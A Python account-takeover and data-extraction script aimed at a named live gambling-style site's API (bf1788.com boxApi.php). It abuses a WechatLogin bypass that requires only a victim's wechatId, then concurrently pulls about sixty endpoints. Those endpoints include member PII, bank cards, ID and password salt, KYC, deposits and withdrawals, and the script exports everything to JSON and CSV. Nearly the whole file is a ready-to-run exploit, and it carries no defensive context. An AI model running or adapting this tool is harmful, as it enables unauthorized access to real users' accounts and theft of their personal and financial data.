#!/usr/bin/env python3
"""
bf1788.com WechatLogin Account Takeover — Complete Data Extraction Tool
=======================================================================
Vuln ID: 1fff1e6c-c53a-4903-88c2-2f18a466e0db
Project: ttww
Target: https://apib63.bf1788.com/boxApi.php

Single-command tool for:
  1. WechatLogin bypass (cmd=1000) — login with only wechatId
  2. Extract data from ALL 60 discovered API endpoints
  3. Export to JSON + CSV automatically

Usage:
  python3 bf1788_at_extractor.py --wechatid <wechatId> [--output-dir DIR]
  python3 bf1788_at_extractor.py --list-cmds  # Print all discovered cmds
"""
import requests, urllib3, json, csv, os, sys, argparse, time
import concurrent.futures
urllib3.disable_warnings()

TARGET = "https://apib63.bf1788.com/boxApi.php"
BASE_PARAMS = {"vendorId": "test", "signature": "test", "site": "bfc", "lang": "tw"}

# All 60 discovered working API commands
ALL_CMDS = [
    101, 103, 110, 111, 112, 121, 208, 210, 211, 260, 262, 264, 266, 267,
    300, 301, 302, 313, 315, 331, 332, 333, 402, 422, 511, 514, 516, 518,
    519, 520, 521, 522, 523, 524, 525, 526, 529, 530, 531, 532, 533, 534,
    535, 536, 541, 542, 543, 544, 545, 562, 600, 602, 603, 605, 606, 607,
    608, 700, 704, 705, 707, 713, 716, 800, 802, 804, 810, 814, 815, 904,
    905, 908, 910, 912, 913, 925, 1001
]

# Known descriptions for each cmd
CMD_DESCRIPTIONS = {
    101: "Member Basic Info (PII)", 103: "Session Refresh", 110: "Games",
    111: "Promotions", 112: "Member PID/Structure", 121: "Agent Info",
    208: "Finance Summary", 210: "Sys Config (min withdraw)", 211: "Bet Summary",
    260: "Game Betting Records", 262: "Game History", 264: "Bet Detail",
    266: "Game Records", 267: "Game Settlement", 300: "Game Halls",
    301: "Game Groups", 302: "Game List", 313: "Game Action",
    315: "Specific Game Info", 331: "Game Status", 332: "Add Game",
    333: "Delete Game", 402: "System Status", 422: "Unknown Data",
    511: "Game Launch URL", 514: "Game URL", 516: "Member Full Profile (PII+Bank+ID+Salt)",
    518: "Game Group Level", 519: "Birthday Flags", 520: "Transaction Page",
    521: "Transaction Page", 522: "Transaction Page", 523: "Transaction Page",
    524: "Transaction Page", 525: "Transaction Page", 526: "Transaction Page",
    529: "Transaction History", 530: "Daily Transactions", 531: "Deposit History",
    532: "Deposit History USD", 533: "Deposit Records", 534: "Withdrawal Records",
    535: "Transfer Records", 536: "Financial Flow", 541: "Rebate/Commission",
    542: "Weekly Bet Detail", 543: "Monthly Report", 544: "Weekly Bet Records",
    545: "Monthly Records", 562: "Unknown", 600: "Return Data",
    602: "Member Line Data", 603: "Member Group Data", 605: "Sub-member Info",
    606: "Member Line Data v2", 607: "Weekly Bet Records", 608: "Bet Statistics",
    700: "Announcements", 704: "Unknown", 705: "Unknown", 707: "Payment Types",
    713: "Withdrawal Types", 716: "Bank Card/Payment Methods",
    800: "Daily VIP Stats", 802: "VIP Summary", 804: "VIP Bonus Apply",
    810: "Lottery List", 814: "System Config", 815: "Mini Game List",
    904: "VIP Level", 905: "Bonus/Commission Records", 908: "Unknown",
    910: "KYC Verification", 912: "Sys Setting", 913: "Sys Setting",
    925: "Sys Setting", 1001: "Unknown"
}


def wechat_login(wechatId):
    """WechatLogin bypass — login with only wechatId, get sid."""
    params = {"cmd": "1000", "wechatId": wechatId, "sid": "", **BASE_PARAMS}
    resp = requests.post(TARGET, data=params, timeout=15, verify=False)
    data = resp.json()
    if data.get("status") == "0" or data.get("status") == 0:
        msg = data.get("msg", {})
        return msg.get("sid"), msg.get("username")
    return None, None


def extract_endpoint(cmd, sid):
    """Extract data from a single API endpoint."""
    params = {"cmd": str(cmd), "sid": sid, **BASE_PARAMS}
    try:
        resp = requests.post(TARGET, data=params, timeout=10, verify=False)
        return cmd, resp.text, resp.headers.get("Set-Cookie", ""), \
               resp.headers.get("Access-Control-Allow-Origin", "")
    except Exception as e:
        return cmd, json.dumps({"error": str(e)}), "", ""


def extract_all(wechatId, output_dir=None):
    """Complete extraction: login + all 60 endpoints."""
    print(f"[*] Target: {TARGET}")
    print(f"[*] WechatID: {wechatId}")

    # Step 1: Login
    print(f"[*] Step 1: WechatLogin bypass (cmd=1000)...")
    sid, username = wechat_login(wechatId)
    if not sid:
        print(f"[-] Login failed for wechatId={wechatId}")
        return None

    print(f"[+] Login successful!")
    print(f"    SID: {sid}")
    print(f"    Username: {username}")

    # Step 2: Extract all endpoints concurrently
    print(f"[*] Step 2: Extracting data from {len(ALL_CMDS)} API endpoints...")

    all_data = {}
    headers = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
        futures = {pool.submit(extract_endpoint, cmd, sid): cmd for cmd in ALL_CMDS}
        for f in concurrent.futures.as_completed(futures):
            cmd, body, set_cookie, cors = f.result()
            if set_cookie and not headers:
                headers["Set-Cookie"] = set_cookie
            if cors and "cors" not in headers:
                headers["Access-Control-Allow-Origin"] = cors

            # Parse response
            try:
                parsed = json.loads(body)
            except:
                parsed = body

            status = "OK"
            msg = ""
            if isinstance(parsed, dict):
                status_val = parsed.get("status", parsed.get("code", ""))
                status = f"status={status_val}"
                if "msg" in parsed:
                    msg_data = parsed["msg"]
                    if isinstance(msg_data, dict):
                        msg = f"dict keys={list(msg_data.keys())}"
                    elif isinstance(msg_data, list):
                        msg = f"list[{len(msg_data)}]"
                    elif isinstance(msg_data, str):
                        msg = f"str={msg_data[:50]}"

            desc = CMD_DESCRIPTIONS.get(cmd, "")
            print(f"  cmd={cmd} ({desc}): {status}, {msg}")

            all_data[str(cmd)] = {
                "cmd": cmd,
                "description": desc,
                "status_code": 200,
                "response_raw": body[:5000],  # Truncate large responses
                "response": parsed if isinstance(parsed, (dict, list, str)) else None
            }

    # Step 3: Save full JSON
    result = {
        "wechatId": wechatId,
        "sid": sid,
        "username": username,
        "extraction_time": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "target": TARGET,
        "vuln_id": "1fff1e6c-c53a-4903-88c2-2f18a466e0db",
        "http_headers": headers,
        "endpoints": all_data
    }

    json_path = None
    csv_path = None
    csv_row = {"wechatId": wechatId, "sid": sid, "username": username,
               "extraction_time": result["extraction_time"]}
    if output_dir:
        os.makedirs(output_dir, exist_ok=True)
        json_path = os.path.join(output_dir, f"full_extract_{wechatId}.json")
        csv_path = os.path.join(output_dir, f"member_data_{wechatId}.csv")

        with open(json_path, "w") as f:
            json.dump(result, f, indent=2, ensure_ascii=False, default=str)
        print(f"\n[+] Full JSON saved: {json_path}")

        # Generate CSV (csv_row already initialized above)
        for cmd_str, entry in all_data.items():
            resp = entry.get("response", {})
            if isinstance(resp, dict) and "msg" in resp:
                msg = resp["msg"]
                if isinstance(msg, dict):
                    for k, v in msg.items():
                        csv_row[f"cmd{entry['cmd']}_{k}"] = str(v)[:500] if not isinstance(v, (dict, list)) else json.dumps(v, ensure_ascii=False)[:500]
                elif isinstance(msg, list):
                    csv_row[f"cmd{entry['cmd']}_list_count"] = len(msg)
                elif isinstance(msg, str):
                    csv_row[f"cmd{entry['cmd']}_msg"] = msg[:500]
            elif isinstance(resp, str):
                csv_row[f"cmd{entry['cmd']}_response"] = resp[:500]

        with open(csv_path, "w", newline="", encoding="utf-8-sig") as f:
            writer = csv.DictWriter(f, fieldnames=list(csv_row.keys()))
            writer.writeheader()
            writer.writerow(csv_row)
        print(f"[+] CSV saved: {csv_path}")

    print(f"\n[*] Total endpoints: {len(all_data)}")
    print(f"[*] Total CSV fields: {len(csv_row) if csv_path else 'N/A'}")

    return result


def list_cmds():
    """Print all discovered API commands."""
    print(f"bf1788.com boxApi.php — Discovered API Commands ({len(ALL_CMDS)} total)")
    print("=" * 80)
    for cmd in ALL_CMDS:
        desc = CMD_DESCRIPTIONS.get(cmd, "Unknown")
        print(f"  cmd={cmd:>4}  {desc}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="bf1788.com WechatLogin Account Takeover — Complete Data Extraction Tool"
    )
    parser.add_argument("--wechatid", help="Target wechatId to extract data for")
    parser.add_argument("--output-dir", default=".", help="Output directory for JSON/CSV")
    parser.add_argument("--list-cmds", action="store_true", help="List all discovered API commands")

    args = parser.parse_args()

    if args.list_cmds:
        list_cmds()
    elif args.wechatid:
        extract_all(args.wechatid, args.output_dir)
    else:
        parser.print_help()
